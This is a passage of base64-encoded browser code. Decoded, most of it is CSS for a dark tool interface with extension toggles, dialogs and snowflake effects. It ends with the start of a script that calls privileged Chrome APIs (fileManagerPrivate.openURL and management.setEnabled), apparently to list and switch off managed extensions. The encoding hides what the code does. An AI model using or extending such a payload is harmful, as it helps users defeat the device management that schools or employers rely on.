4OwogICAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgfQogICAgICAuZXh0ZW5zaW9uLW5hbWUgewogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICB9Ci50b2dnbGUtc3dpdGNoIHsKICBtYXJnaW4tbGVmdDogYXV0bzsgCiAgbWFyZ2luLXJpZ2h0OiAwOwogIHBvc2l0aW9uOiByZWxhdGl2ZTsKICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7CiAgd2lkdGg6IDYwcHg7CiAgaGVpZ2h0OiAzMHB4Owp9CgoudG9nZ2xlLXN3aXRjaCBpbnB1dCB7CiAgb3BhY2l0eTogMDsKICB3aWR0aDogMDsKICBoZWlnaHQ6IDA7Cn0KCi5zbGlkZXIgewogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBjdXJzb3I6IHBvaW50ZXI7CiAgdG9wOiAwOwogIGxlZnQ6IDA7CiAgcmlnaHQ6IDA7CiAgYm90dG9tOiAwOwogIGJhY2tncm91bmQtY29sb3I6ICMyNzI3MmE7CiAgdHJhbnNpdGlvbjogMC40czsKICBib3JkZXItcmFkaXVzOiA5OTk5cHg7Cn0KCi5zbGlkZXI6YmVmb3JlIHsKICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgY29udGVudDogIiI7CiAgaGVpZ2h0OiAyNnB4OyAvKiBJbmNyZWFzZWQgc2l6ZSAqLwogIHdpZHRoOiAyNnB4OyAgLyogSW5jcmVhc2VkIHNpemUgKi8KICBsZWZ0OiA0cHg7CiAgYm90dG9tOiAycHg7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsgCiAgdHJhbnNpdGlvbjogMC40czsKICBib3JkZXItcmFkaXVzOiA1MCU7CiAgdHJhbnNmb3JtOiB0cmFuc2xhdGVYKDApOyAvKiBTdGFydCBieSBhbGlnbmluZyB0aGUgZG90IHRvIHRoZSBsZWZ0ICovCn0KCmlucHV0OmNoZWNrZWQgKyAuc2xpZGVyIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmOyAKfQoKaW5wdXQ6Y2hlY2tlZCArIC5zbGlkZXI6YmVmb3JlIHsKICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoMjZweCk7IC8qIEFkanVzdGVkIHRyYW5zbGF0aW9uIGZvciB0aGUgbGFyZ2VyIGRvdCAqLwp9CgoJCS5oZWFkZXIgewogICAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgfQogICAgICAubG9nbyB7CiAgICAgICAgd2lkdGg6IDRlbTsgCiAgICAgICAgaGVpZ2h0OiBhdXRvOwogICAgICAgIG1hcmdpbi1yaWdodDogMTBweDsKICAgICAgfQogICAgICAudGFibGlzdC1pdGVtIHsKICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMzMzOwogICAgICAgIG1hcmdpbi1ib3R0b206IDEwcHg7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjojMDAwOwogICAgICAgIHBhZGRpbmc6IDE1cHg7CiAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgIGRpc3BsYXk6IGZsZXg7CgkJZm9udC13ZWlnaHQ6Ym9sZDsKICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IHN0YXJ0OwogICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgIH0KICAgICAgLnRhYmxpc3QtaXRlbSBpbWcgewogICAgICAgIG1heC13aWR0aDogMjVweDsKICAgICAgICBtYXJnaW4tcmlnaHQ6IDEwcHg7CiAgICAgIH0KICAgICAgLnRhYmxpc3QtaXRlbSBzcGFuIHsKICAgICAgICBwYWRkaW5nOiAxMHB4LCAwOwogICAgICAgIHRleHQtb3ZlcmZsb3c6IGVsbGlwc2lzOwogICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgIHdoaXRlLXNwYWNlOiBub3dyYXA7CiAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsKICAgICAgICB3b3JkLWJyZWFrOiBicmVhay1hbGw7CiAgICAgIH0KICAgICAgLnRhYmxpc3QtaXRlbSBzcGFuOmhvdmVyIHsKICAgICAgICBvdmVyZmxvdzogdmlzaWJsZTsgCiAgICAgICAgd2hpdGUtc3BhY2U6IG5vcm1hbDsKICAgICAgICBoZWlnaHQ6YXV0bzsgIAogICAgICB9CmJ1dHRvbiB7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOyAKICAgIGNvbG9yOiAjZmZmOyAKICAgIGJvcmRlcjogMXB4IHNvbGlkICMzMzM7IAogICAgcGFkZGluZzogOHB4IDE2cHg7IAoJbWFyZ2luOiA0cHggMnB4OwogICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgYm9yZGVyLXJhZGl1czogNnB4OyAKICAgIGN1cnNvcjogcG9pbnRlcjsKICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4zcywgY29sb3IgMC4zcywgYm9yZGVyLWNvbG9yIDAuM3M7CiAgICBmb250LXNpemU6IDE0cHg7IAogICAgZm9udC13ZWlnaHQ6IGJvbGQ7IAoJICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwp9CgpidXR0b246aG92ZXIgewogICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzLCBjb2xvciAwLjNzLCBib3JkZXItY29sb3IgMC4zczsKICAgIGJhY2tncm91bmQtY29sb3I6ICMxMTE7IAogICAgYm9yZGVyLWNvbG9yOiAjZmZmOyAKCn0KaW5wdXQgewogICAgcGFkZGluZzogOHB4IDE2cHg7IAoJbWFyZ2luOiA0cHggMnB4OwoJY29sb3I6d2hpdGU7CiAgICBib3JkZXI6IDFweCBzb2xpZCAjMzMzICFpbXBvcnRhbnQ7IAp9CmlucHV0OmhvdmVyIHsKICAgIGJhY2tncm91bmQtY29sb3I6ICMxMTE7IAogICAgYm9yZGVyLWNvbG9yOiAjZmZmOyAKfQojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvbiB7CiAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICBkaXNwbGF5OiBpbmxpbmUtZmxleDsKICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGZsZXgtc3RhcnQ7CiAgICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3MsIGNvbG9yIDAuM3M7CiAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgYm9yZGVyOiBub25lOwogICAgcGFkZGluZzogOXB4IDE1cHggOXB4IDYwcHg7CiAgICB0ZXh0LWFsaWduOiBsZWZ0OwogICAgYm9yZGVyLXJhZGl1czogNnB4OwogICAgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IAogICAgY29sb3I6IGJsYWNrOyAKICAgIGN1cnNvcjogcG9pbnRlcjsKICAgIG1hcmdpbjogNHB4IDJweDsKfQoKI3RvZ2dsZWFibGUtYnV0dG9ucyBidXR0b246aG92ZXIgewogICAgYmFja2dyb3VuZC1jb2xvcjogI2UyZTJlMjsgCn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uOjpiZWZvcmUgewogICAgY29udGVudDogJyc7CiAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICBsZWZ0OiAxMnB4OwogICAgdG9wOiA1MCU7CiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTUwJSk7CiAgICB3aWR0aDogNDJweDsKICAgIGhlaWdodDogMjJweDsKICAgIGJhY2tncm91bmQtY29sb3I6ICMzMzM7IAogICAgYm9yZGVyLXJhZGl1czogMTJweDsKICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4zczsKfQoKI3RvZ2dsZWFibGUtYnV0dG9ucyBidXR0b246OmFmdGVyIHsKICAgIGNvbnRlbnQ6ICcnOwogICAgcG9zaXRpb246IGFic29sdXRlOwogICAgbGVmdDogMTRweDsKICAgIHRvcDogNTAlOwogICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC01MCUpOwogICAgd2lkdGg6IDE4cHg7CiAgICBoZWlnaHQ6IDE4cHg7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmOyAKICAgIGJvcmRlci1yYWRpdXM6IDUwJTsKICAgIHRyYW5zaXRpb246IHRyYW5zZm9ybSAwLjNzLCBiYWNrZ3JvdW5kLWNvbG9yIDAuM3M7Cn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uW3RvZ2dsZWQ9InRydWUiXSB7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTJlMmUyOyAKfQoKI3RvZ2dsZWFibGUtYnV0dG9ucyBidXR0b25bdG9nZ2xlZD0idHJ1ZSJdOjpiZWZvcmUgewogICAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsgCn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uW3RvZ2dsZWQ9InRydWUiXTo6YWZ0ZXIgewogICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC01MCUpIHRyYW5zbGF0ZVgoMjBweCk7IAogICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsgCn0KCiAgICAgIC5jb250YWluZXIgewogICAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgICAgZ2FwOiAxMHB4OwogICAgICB9CiAgICAgI2NvZGUtcnVuIHsKICBhbGlnbi1zZWxmOiBmbGV4LXN0YXJ0OwogIGJhY2tncm91bmQtY29sb3I6ICNmZmY7IAogIGJvcmRlcjpub25lOwogIGNvbG9yOiBibGFjazsKICBjdXJzb3I6IHBvaW50ZXI7CiAgYm9yZGVyLXJhZGl1czogNXB4OwogIHBhZGRpbmc6IDhweCAxNnB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4zcyBlYXNlLWluLW91dDsKfQoKI2NvZGUtcnVuOmhvdmVyIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTJlMmUyOyAKICBib3JkZXI6bm9uZTsKfQoKI2NvZGUgewogIGJhY2tncm91bmQ6IHJnYigwLCAwLCAwKTsgCiAgY29sb3I6IHdoaXRlOwogIHdpZHRoOiAxMDAlOwogIG1pbi1oZWlnaHQ6IDUwcHg7CiAgaGVpZ2h0OiAyMDBweDsKICByZXNpemU6IGJvdGg7CiAgYm9yZGVyOiAxcHggc29saWQgIzRCNEI0RDsgCiAgYm9yZGVyLXJhZGl1czogNXB4OwogIGZvbnQtZmFtaWx5OiBtb25vc3BhY2UsIHNhbnMtc2VyaWY7CiAgcGFkZGluZzogOHB4OwogIGJveC1zaXppbmc6IGJvcmRlci1ib3g7CiAgdHJhbnNpdGlvbjogb3V0bGluZSAwLjNzIGVhc2UtaW4tb3V0Owp9CgojY29kZTpmb2N1cyB7CmJvcmRlci1jb2xvcjojZmZmOwp9CgogICAgICBpbnB1dFt0eXBlPSdjaGVja2JveCddIHsKICAgICAgICBhY2NlbnQtY29sb3I6ICNmZmYgIWltcG9ydGFudDsKICAgICAgfQogICAgICBpbnB1dFtpZD0nVGFiVVJMSW5wdXQnXSB7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzBhMGEwYSAhaW1wb3J0YW50OwogICAgICAgIGJvcmRlci1jb2xvcjogI2ZmZiAhaW1wb3J0YW50OwogICAgICAgIGJvcmRlci1zdHlsZTogc29saWQ7CiAgICAgICAgYm9yZGVyLXJhZGl1czogM3B4OwogICAgICB9CiAgICAgIC50b2FzdFtwb3BvdmVyXTpwb3BvdmVyLW9wZW4gewogICAgICAgIG9wYWNpdHk6IDE7CiAgICAgICAgdG9wOiA1cHg7CiAgICAgICAgbGVmdDogNTAlOwogICAgICB9CiAgICAgIEBzdGFydGluZy1zdHlsZSB7CiAgICAgICAgLnRvYXN0W3BvcG92ZXJdOnBvcG92ZXItb3BlbiB7CiAgICAgICAgICBvcGFjaXR5OiAwOwogICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0xMDAlKTsKICAgICAgICB9CiAgICAgIH0KICAgICAgLnRvYXN0W3BvcG92ZXJdIHsKICAgICAgICBwb3NpdGlvbjogZml4ZWQ7CiAgICAgICAgaW5zZXQ6IHVuc2V0OwogICAgICAgIHBhZGRpbmc6IDVweCAxMHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7CiAgICAgICAgb3BhY2l0eTogMDsKICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC41cyBhbGxvdy1kaXNjcmV0ZTsKICAgICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgICBiYWNrZ3JvdW5kOiMwYTBhMGE7CiAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICM0NDQ7CiAgICAgICAgd2hpdGUtc3BhY2U6IHByZS13cmFwOwogICAgICB9CiAgICAgIGRpYWxvZ1tvcGVuXSB7CiAgICAgICAgb3BhY2l0eTogMTsKICAgICAgICB0cmFuc2Zvcm06IHNjYWxlKDEpOwogICAgICB9CiAgICAgIGRpYWxvZyB7CiAgICAgICAgb3BhY2l0eTogMDsKICAgICAgICBwYWRkaW5nOiAzMHB4OwogICAgICAgIHBhZGRpbmctYm90dG9tOiAxNXB4OwogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICMyZDJkMmQ7CiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgwLjk1KTsKICAgICAgICBiYWNrZ3JvdW5kOiAjMDAwOwogICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHJhZGlhbC1ncmFkaWVudCgjMzMzIDFweCwgdHJhbnNwYXJlbnQgMXB4KTsKICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IDJyZW0gMnJlbTsKICAgICAgICB6LWluZGV4OiAtMTsKICAgICAgICBhbmltYXRpb246IG1vdmVHcmlkIDRzIGxpbmVhciBpbmZpbml0ZTsKICAgICAgICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLXBvc2l0aW9uLXggNDAwbXM7CiAgICAgICAgYm9yZGVyLXJhZGl1czogMTBweDsKICAgICAgICB0cmFuc2l0aW9uOiBvdmVybGF5IDAuNXMgYWxsb3ctZGlzY3JldGUsIGRpc3BsYXkgMC41cyBhbGxvdy1kaXNjcmV0ZSwgb3BhY2l0eSAwLjVzIGFsbG93LWRpc2NyZXRlLCB0cmFuc2Zvcm0gMC41cyBhbGxvdy1kaXNjcmV0ZTsKICAgICAgICBtaW4td2lkdGg6IDUwdnc7CiAgICAgICAgbWluLWhlaWdodDogNjB2aDsKICAgICAgICBtYXgtd2lkdGg6IDUwdnc7CiAgICAgICAgbWF4LWhlaWdodDogNjB2aDsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgIH0KICAgICAgQHN0YXJ0aW5nLXN0eWxlIHsKICAgICAgICBkaWFsb2dbb3Blbl0gewogICAgICAgICAgb3BhY2l0eTogMDsKICAgICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMC45NSk7CiAgICAgICAgfQogICAgICB9CiAgICAgIGRpYWxvZzo6YmFja2Ryb3AgewogICAgICAgIGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OwogICAgICAgIGJhY2tkcm9wLWZpbHRlcjogYmx1cigwcHgpOwogICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjVzIGFsbG93LWRpc2NyZXRlOwogICAgICB9CiAgICAgIGRpYWxvZ1tvcGVuXTo6YmFja2Ryb3AgewogICAgICAgIGJhY2tncm91bmQtY29sb3I6IHJnYigwIDAgMCAvIDAuMjUpOwogICAgICAgIGJhY2tkcm9wLWZpbHRlcjogYmx1cigzcHgpOwogICAgICB9CiAgICAgIEBzdGFydGluZy1zdHlsZSB7CiAgICAgICAgZGlhbG9nW29wZW5dOjpiYWNrZHJvcCB7CiAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsKICAgICAgICAgIGJhY2tkcm9wLWZpbHRlcjogYmx1cigwcHgpOwogICAgICAgIH0KICAgICAgfQogICAgICBkaWFsb2cgZGl2IHsKICAgICAgICBtaW4td2lkdGg6IGF1dG87CiAgICAgICAgd2lkdGg6IGF1dG87CiAgICAgICAgaGVpZ2h0OiBmaXQtY29udGVudDsKICAgICAgICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKICAgICAgICB3aGl0ZS1zcGFjZTogcHJlLXdyYXA7CiAgICAgICAgcGFkZGluZzogbm9uZTsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiMwMDA7CgogICAgICB9CiAgICAgIGRpYWxvZyBwIHsKICAgICAgICBtYXJnaW4tYm90dG9tOiA5cHg7CiAgICAgICAgcGFkZGluZzogOXB4OwogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICMyNzI3MmE7CiAgICAgICAgY29sb3I6IGluaGVyaXQ7CiAgICAgICAgZm9udC1mYW1pbHk6IGluaGVyaXQ7CiAgICAgICAgZm9udC1zaXplOiBpbmhlcml0OwogICAgICAgIGZvbnQtd2VpZ2h0OiA3MDA7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgICAgIHdpZHRoOiBhdXRvOwogICAgICB9CiAgICAgIGRpYWxvZyBoMSB7CiAgICAgICAgZm9udC1mYW1pbHk6ICdHZWlzdCcsIHNhbnMtc2VyaWY7CiAgICAgICAgZm9udC1zaXplOiAxLjVyZW07CiAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgIGZvbnQtd2VpZ2h0OiA5MDA7CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMjVweDsKICAgICAgICBtYXJnaW4tdG9wOiAwOwogICAgICB9Ci5wcmFoaXQtY29udGFpbmVyIHsKICBwb3NpdGlvbjogZml4ZWQ7CiAgdG9wOiA1MCU7CiAgbGVmdDogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlKC01MCUsIC01MCUpOwogIHotaW5kZXg6IDk5OTk7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGRpc3BsYXk6IGZsZXg7CiAgbWF4LWhlaWdodDogOTAlOwogIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgZ2FwOiAxMHB4OyAKICBhbGlnbi1pdGVtczogY2VudGVyOwogIGp1c3RpZnktY29udGVudDogY2VudGVyOwp9CgoucHJhaGl0LWltYWdlIHsKICBoZWlnaHQ6IDYwMHB4OwogIGJvcmRlci1yYWRpdXM6IDIwcHg7CiAgYm94LXNoYWRvdzogMCA0cHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSk7CiAgLXdlYmtpdC1hbmltYXRpb24tbmFtZTogc2hha2U7CiAgLXdlYmtpdC1hbmltYXRpb24tZHVyYXRpb246IDAuNXM7CiAgLXdlYmtpdC10cmFuc2Zvcm0tb3JpZ2luOiA1MCUgNTAlOwogIC13ZWJraXQtYW5pbWF0aW9uLWl0ZXJhdGlvbi1jb3VudDogaW5maW5pdGU7Cn0KCkAtd2Via2l0LWtleWZyYW1lcyBzaGFrZSB7CiAgMCUgeyAtd2Via2l0LXRyYW5zZm9ybTogdHJhbnNsYXRlKDVweCwgM3B4KSByb3RhdGUoMGRlZyk7IH0KICAxMCUgeyAtd2Via2l0LXRyYW5zZm9ybTogdHJhbnNsYXRlKC01cHgsIC02cHgpIHJvdGF0ZSgtM2RlZyk7IH0KICAyMCUgeyAtd2Via2l0LXRyYW5zZm9ybTogdHJhbnNsYXRlKC04cHgsIDBweCkgcm90YXRlKDNkZWcpOyB9CiAgMzAlIHsgLXdlYmtpdC10cmFuc2Zvcm06IHRyYW5zbGF0ZSgwcHgsIDZweCkgcm90YXRlKDBkZWcpOyB9CiAgNDAlIHsgLXdlYmtpdC10cmFuc2Zvcm06IHRyYW5zbGF0ZSgzcHgsIC00cHgpIHJvdGF0ZSgzZGVnKTsgfQogIDUwJSB7IC13ZWJraXQtdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTNweCwgNnB4KSByb3RhdGUoLTNkZWcpOyB9CiAgNjAlIHsgLXdlYmtpdC10cmFuc2Zvcm06IHRyYW5zbGF0ZSgtOHB4LCAzcHgpIHJvdGF0ZSgwZGVnKTsgfQogIDcwJSB7IC13ZWJraXQtdHJhbnNmb3JtOiB0cmFuc2xhdGUoNXB4LCAzcHgpIHJvdGF0ZSgtM2RlZyk7IH0KICA4MCUgeyAtd2Via2l0LXRyYW5zZm9ybTogdHJhbnNsYXRlKC0zcHgsIC0zcHgpIHJvdGF0ZSgzZGVnKTsgfQogIDkwJSB7IC13ZWJraXQtdHJhbnNmb3JtOiB0cmFuc2xhdGUoNXB4LCA2cHgpIHJvdGF0ZSgwZGVnKTsgfQogIDEwMCUgeyAtd2Via2l0LXRyYW5zZm9ybTogdHJhbnNsYXRlKDNweCwgLTZweCkgcm90YXRlKC0zZGVnKTsgfQp9CgoucHJhaGl0LXRleHRib3ggewogIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwgMCwgMCwgMC44KTsgCiAgY29sb3I6IHdoaXRlOwogIHBhZGRpbmc6IDEwcHg7CiAgYm9yZGVyLXJhZGl1czogNXB4OwogIGZvbnQtc2l6ZTogMTZweDsKICBtYXgtd2lkdGg6IDEwMCU7IAogIG1hcmdpbjogMTBweCAwOwp9CgpALXdlYmtpdC1rZXlmcmFtZXMgc25vd2ZsYWtlcy1mYWxsezAle3RvcDotMTAlfTEwMCV7dG9wOjEwMCV9fUAtd2Via2l0LWtleWZyYW1lcyBzbm93Zmxha2VzLXNoYWtlezAlLDEwMCV7LXdlYmtpdC10cmFuc2Zvcm06dHJhbnNsYXRlWCgwKTt0cmFuc2Zvcm06dHJhbnNsYXRlWCgwKX01MCV7LXdlYmtpdC10cmFuc2Zvcm06dHJhbnNsYXRlWCg4MHB4KTt0cmFuc2Zvcm06dHJhbnNsYXRlWCg4MHB4KX19QGtleWZyYW1lcyBzbm93Zmxha2VzLWZhbGx7MCV7dG9wOi0xMCV9MTAwJXt0b3A6MTAwJX19QGtleWZyYW1lcyBzbm93Zmxha2VzLXNoYWtlezAlLDEwMCV7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoMCl9NTAle3RyYW5zZm9ybTp0cmFuc2xhdGVYKDgwcHgpfX0uc25vd2ZsYWtle3Bvc2l0aW9uOmZpeGVkO3RvcDotMTAlO3otaW5kZXg6OTk5OTstd2Via2l0LXVzZXItc2VsZWN0Om5vbmU7LW1vei11c2VyLXNlbGVjdDpub25lOy1tcy11c2VyLXNlbGVjdDpub25lO3VzZXItc2VsZWN0Om5vbmU7Y3Vyc29yOmRlZmF1bHQ7LXdlYmtpdC1hbmltYXRpb24tbmFtZTpzbm93Zmxha2VzLWZhbGwsc25vd2ZsYWtlcy1zaGFrZTstd2Via2l0LWFuaW1hdGlvbi1kdXJhdGlvbjoxMHMsM3M7LXdlYmtpdC1hbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOmxpbmVhcixlYXNlLWluLW91dDstd2Via2l0LWFuaW1hdGlvbi1pdGVyYXRpb24tY291bnQ6aW5maW5pdGUsaW5maW5pdGU7LXdlYmtpdC1hbmltYXRpb24tcGxheS1zdGF0ZTpydW5uaW5nLHJ1bm5pbmc7YW5pbWF0aW9uLW5hbWU6c25vd2ZsYWtlcy1mYWxsLHNub3dmbGFrZXMtc2hha2U7YW5pbWF0aW9uLWR1cmF0aW9uOjEwcywzczthbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOmxpbmVhcixlYXNlLWluLW91dDthbmltYXRpb24taXRlcmF0aW9uLWNvdW50OmluZmluaXRlLGluZmluaXRlO2FuaW1hdGlvbi1wbGF5LXN0YXRlOnJ1bm5pbmcscnVubmluZ30uc25vd2ZsYWtlOm50aC1vZi10eXBlKDApe2xlZnQ6MSU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6MHMsMHM7YW5pbWF0aW9uLWRlbGF5OjBzLDBzfS5zbm93Zmxha2U6bnRoLW9mLXR5cGUoMSl7bGVmdDoxMCU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6MXMsMXM7YW5pbWF0aW9uLWRlbGF5OjFzLDFzfS5zbm93Zmxha2U6bnRoLW9mLXR5cGUoMil7bGVmdDoyMCU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6NnMsLjVzO2FuaW1hdGlvbi1kZWxheTo2cywuNXN9LnNub3dmbGFrZTpudGgtb2YtdHlwZSgzKXtsZWZ0OjMwJTstd2Via2l0LWFuaW1hdGlvbi1kZWxheTo0cywyczthbmltYXRpb24tZGVsYXk6NHMsMnN9LnNub3dmbGFrZTpudGgtb2YtdHlwZSg0KXtsZWZ0OjQwJTstd2Via2l0LWFuaW1hdGlvbi1kZWxheToycywyczthbmltYXRpb24tZGVsYXk6MnMsMnN9LnNub3dmbGFrZTpudGgtb2YtdHlwZSg1KXtsZWZ0OjUwJTstd2Via2l0LWFuaW1hdGlvbi1kZWxheTo4cywzczthbmltYXRpb24tZGVsYXk6OHMsM3N9LnNub3dmbGFrZTpudGgtb2YtdHlwZSg2KXtsZWZ0OjYwJTstd2Via2l0LWFuaW1hdGlvbi1kZWxheTo2cywyczthbmltYXRpb24tZGVsYXk6NnMsMnN9LnNub3dmbGFrZTpudGgtb2YtdHlwZSg3KXtsZWZ0OjcwJTstd2Via2l0LWFuaW1hdGlvbi1kZWxheToyLjVzLDFzO2FuaW1hdGlvbi1kZWxheToyLjVzLDFzfS5zbm93Zmxha2U6bnRoLW9mLXR5cGUoOCl7bGVmdDo4MCU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6MXMsMHM7YW5pbWF0aW9uLWRlbGF5OjFzLDBzfS5zbm93Zmxha2U6bnRoLW9mLXR5cGUoOSl7bGVmdDo5MCU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6M3MsMS41czthbmltYXRpb24tZGVsYXk6M3MsMS41c30uc25vd2ZsYWtlOm50aC1vZi10eXBlKDEwKXtsZWZ0OjI1JTstd2Via2l0LWFuaW1hdGlvbi1kZWxheToycywwczthbmltYXRpb24tZGVsYXk6MnMsMHN9LnNub3dmbGFrZTpudGgtb2YtdHlwZSgxMSl7bGVmdDo2NSU7LXdlYmtpdC1hbmltYXRpb24tZGVsYXk6NHMsMi41czthbmltYXRpb24tZGVsYXk6NHMsMi41c30KLnNub3dmbGFrZSB7CiAgei1pbmRleDogOTk7CiAgY29sb3I6ICNmZmZmZmY7CiAgZm9udC1zaXplOiAxZW07CiAgZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOwogIHRleHQtc2hhZG93OiAwIDAgNXB4ICMwMDAwMDA7CiAgb3BhY2l0eTogMC43Owp9CndoaXRlYnV0dG9ucyBidXR0b24gewogIGJhY2tncm91bmQtY29sb3I6IHdoaXRlOwogIGJvcmRlcjogbm9uZTsKICBjb2xvcjogYmxhY2s7Cn0KCndoaXRlYnV0dG9ucyBidXR0b246aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7Cn0KbGl0c3R1ZmZ7CmNvbG9yOiM0NDQ7CmZvbnQtZmFtaWx5OiBtb25vc3BhY2UsIHNhbnMtc2VyaWY7CmZvbnQtc2l6ZToxMnB4Owpmb250LXdlaWdodDogbm9ybWFsOwptYXJnaW4tbGVmdDo2cHg7CmZvbnQtc3R5bGU6aXRhbGljOwp9CiAgICA8L3N0eWxlPgogIGA7CgpvbmxvYWQgPSBhc3luYyBmdW5jdGlvbiB4KCkgewogICAgbGV0IGZvdW5kTm90aGluZyA9IHRydWU7CiAgICBkb2N1bWVudC5vcGVuKCk7CiAgICB0aGlzLmRvY3VtZW50LndyaXRlKGh0bWxTdHlsZSk7CiAgICBkb2N1bWVudC5jbG9zZSgpOwoKICAgIGlmIChjaHJvbWUuZmlsZU1hbmFnZXJQcml2YXRlKSB7CiAgICAgICAgY2hyb21lLmZpbGVNYW5hZ2VyUHJpdmF0ZS5vcGVuVVJMKCJkYXRhOnRleHQvaHRtbCw8aDE+SGVsbG88L2gxPiIpOwogICAgICAgIGRvY3VtZW50LndyaXRlKGZpbGVNYW5hZ2VyUHJpdmF0ZVRlbXBsYXRlKTsKICAgICAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNidG5fRk1QX29wZW5VUkwiKS5vbmNsaWNrID0gZnVuY3Rpb24oZXYpIHt9OwogICAgfQoKICAgIGlmIChjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKSB7CiAgICAgICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoImJlZm9yZWVuZCIsIG1hbmFnZW1lbnRUZW1wbGF0ZSk7CiAgICAgICAgY29uc3QgZXh0bGlzdF9lbGVtZW50ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiLmV4dGxpc3QiKTsKCiAgICAgICAgYXdhaXQgdXBkYXRlRXh0ZW5zaW9uU3RhdHVzKGV4dGxpc3RfZWxlbWVudCk7CiAgICAgICAgY29uc3QgY29udGFpbmVyX2V4dGVuc2lvbnMgPSBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoCiAgICAgICAgICAgICIjY2hyb21lX21hbmFnZW1l